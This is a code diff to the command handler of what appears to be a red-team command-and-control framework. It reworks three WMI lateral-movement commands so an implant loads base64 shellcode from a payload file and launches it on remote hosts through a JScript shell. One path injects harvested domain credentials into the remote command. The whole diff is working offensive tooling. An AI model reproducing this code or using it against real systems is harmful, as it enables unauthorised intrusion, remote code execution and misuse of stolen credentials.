@@ -235,14 +235,13 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
 
     elif command.startswith("invoke-wmijsproxypayload"):
         check_module_loaded("New-JScriptShell.ps1", randomuri, user)
-        if os.path.isfile(("%s%sDotNet2JS.js" % (PayloadsDirectory, "Proxy"))):
-            with open("%s%sDotNet2JS.js" % (PayloadsDirectory, "Proxy"), "r") as p:
+        if os.path.isfile(("%s%sDotNet2JS.b64" % (PayloadsDirectory, "Proxy"))):
+            with open("%s%sDotNet2JS.b64" % (PayloadsDirectory, "Proxy"), "r") as p:
                 payload = p.read()
-            payload = base64.b64encode(payload.encode('UTF-8'))
             params = re.compile("invoke-wmijsproxypayload ", re.IGNORECASE)
             params = params.sub("", command)
-            new_task("$Payload=\"%s\"" % (payload.decode('utf-8')), user, randomuri)
-            cmd = "new-jscriptshell %s -payload $Payload" % (params)
+            new_task("$Shellcode64=\"%s\" #%s" % (payload, "%s%sDotNet2JS.b64" % (PayloadsDirectory, "Proxy")), user, randomuri)
+            cmd = "new-jscriptshell %s -payload $Shellcode64" % (params)
             new_task(cmd, user, randomuri)
         else:
             startup(user, "Need to run createproxypayload first")
@@ -250,24 +249,21 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
     elif command.startswith("invoke-wmijsdaisypayload"):
         check_module_loaded("New-JScriptShell.ps1", randomuri, user)
         daisyname = input("Name required: ")
-        if os.path.isfile(("%s%sDotNet2JS.js" % (PayloadsDirectory, daisyname))):
-            with open("%s%sDotNet2JS.js" % (PayloadsDirectory, daisyname), "r") as p:
+        if os.path.isfile(("%s%sDotNet2JS.b64" % (PayloadsDirectory, daisyname))):
+            with open("%s%sDotNet2JS.b64" % (PayloadsDirectory, daisyname), "r") as p:
                 payload = p.read()
-            payload = base64.b64encode(payload.encode('UTF-8'))
             params = re.compile("invoke-wmijsdaisypayload ", re.IGNORECASE)
             params = params.sub("", command)
-            new_task("$Payload=\"%s\"" % (payload.decode('utf-8')), user, randomuri)
-            cmd = "new-jscriptshell %s -payload $Payload" % (params)
+            new_task("$Shellcode64=\"%s\" #%s" % (payload, "%s%sDotNet2JS.b64" % (PayloadsDirectory, daisyname)), user, randomuri)
+            cmd = "new-jscriptshell %s -payload $Shellcode64" % (params)
             new_task(cmd, user, randomuri)
         else:
             startup(user, "Need to run createdaisypayload first")
 
     elif command.startswith("invoke-wmijspayload"):
         check_module_loaded("New-JScriptShell.ps1", randomuri, user)
-        with open("%s%sDotNet2JS.js" % (PayloadsDirectory, ""), "r") as p:
+        with open("%s%sDotNet2JS.b64" % (PayloadsDirectory, ""), "r") as p:
             payload = p.read()
-        payload = base64.b64encode(payload.encode('UTF-8'))
-
         params = re.compile("invoke-wmijspayload ", re.IGNORECASE)
         params = params.sub("", command)
         if "-credid" in command:
@@ -282,8 +278,8 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
                 startup(user, "Unrecognised CredID: %s" % credId)
             params = params.replace("-credid %s" % credId, "")
             params = params + "-domain %s -user %s -pass %s" % (creds['Domain'], creds['Username'], creds['Password'])
-        new_task("$Payload=\"%s\"" % (payload.decode('utf-8')), user, randomuri)
-        cmd = "new-jscriptshell %s -payload $Payload" % (params)
+        new_task("$Shellcode64=\"%s\" #%s" % (payload, "%s%sDotNet2JS.b64" % (PayloadsDirectory, "")), user, randomuri)
+        cmd = "new-jscriptshell %s -payload $Shellcode64" % (params)
         new_task(cmd, user, randomuri)
 
     elif command.startswith("invoke-wmiproxypayload"):
